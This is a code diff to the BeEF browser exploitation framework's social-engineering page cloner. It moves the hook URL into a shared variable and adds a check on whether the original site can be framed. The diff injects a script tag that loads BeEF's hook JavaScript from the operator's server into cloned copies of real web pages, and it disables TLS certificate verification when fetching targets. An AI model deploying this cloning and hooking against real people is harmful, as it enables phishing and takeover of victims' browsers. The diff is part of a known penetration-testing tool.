@@ -24,6 +24,7 @@ module BeEF
           @http_server = BeEF::Core::Server.instance
           @config = BeEF::Core::Configuration.instance
           @cloned_pages_dir = "#{File.expand_path('../../../../extensions/social_engineering/web_cloner', __FILE__)}/cloned_pages/"
+          @beef_hook = "http://#{@config.get('beef.http.host')}:#{@config.get('beef.http.port')}#{@config.get('beef.http.hook_file')}"
         end
 
         def clone_page(url)
@@ -68,7 +69,10 @@ module BeEF
           print_info "Page at URL [#{url}] has been cloned. Modified HTML in [cloned_paged/#{output_mod}]"
 
           file_path = @cloned_pages_dir + output_mod # the path to the cloned_pages directory where we have the HTML to serve
-          @http_server.mount("/#{output}", BeEF::Extension::SocialEngineering::Interceptor.new(file_path, url))
+
+          # Check if the original URL can be framed
+          frameable = is_frameable(url)
+          @http_server.mount("/#{output}", BeEF::Extension::SocialEngineering::Interceptor.new(file_path, url, frameable, @beef_hook))
           print_info "Mounting cloned page on URL [/#{output}]"
           @http_server.remap
         end
@@ -76,12 +80,31 @@ module BeEF
         private
         # Replace </head> with <BeEF_hook></head>
         def add_beef_hook(line)
-           host = @config.get('beef.http.host')
-           port = @config.get('beef.http.port')
-           js = @config.get('beef.http.hook_file')
-           hook = "http://#{host}:#{port}#{js}"
-           line.gsub!("</head>","<script type=\"text/javascript\" src=\"#{hook}\"></script>\n</head>")
+           line.gsub!("</head>","<script type=\"text/javascript\" src=\"#{@beef_hook}\"></script>\n</head>")
            line
+        end
+
+        private
+        # check if the original URL can be framed. NOTE: doesn't check for framebusting code atm
+        def is_frameable(url)
+          result = true
+          uri = URI(url)
+          http = Net::HTTP.new(uri.host, uri.port)
+          if uri.scheme == "https"
+            http.use_ssl = true
+            http.verify_mode = OpenSSL::SSL::VERIFY_NONE
+          end
+          request = Net::HTTP::Get.new(uri.request_uri)
+          response = http.request(request)
+          frame_opt = response["X-Frame-Options"]
+
+          if frame_opt != nil
+            if frame_opt.casecmp("DENY") == 0 || frame_opt.casecmp("SAMEORIGIN") == 0
+              result = false
+            end
+          end
+          print_info "Page can be framed: [#{result}]"
+          result
         end
 
       end
